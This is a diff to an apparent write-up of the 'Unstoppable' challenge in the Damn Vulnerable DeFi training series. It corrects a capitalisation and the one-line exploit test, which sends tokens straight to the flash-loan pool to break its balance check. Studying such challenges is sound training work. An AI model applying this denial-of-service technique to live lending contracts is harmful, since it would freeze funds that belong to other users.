@@ -8,7 +8,7 @@ https://www.damnvulnerabledefi.xyz/
 
 # Introduction
 
-Unstoppable is the first challenge in the Damn Vulnerable DeFi series.
+unstoppable is the first challenge in the Damn Vulnerable DeFi series.
 
 Challenge description: 
 There's a lending pool with a million DVT tokens in balance, offering flash loans for free.
@@ -63,6 +63,6 @@ send DamnValuableTokens to UnstoppableLender contract without using depositToken
 
 ```javascript
 it('Exploit', async function () {
-    await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+    await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 });
 ```
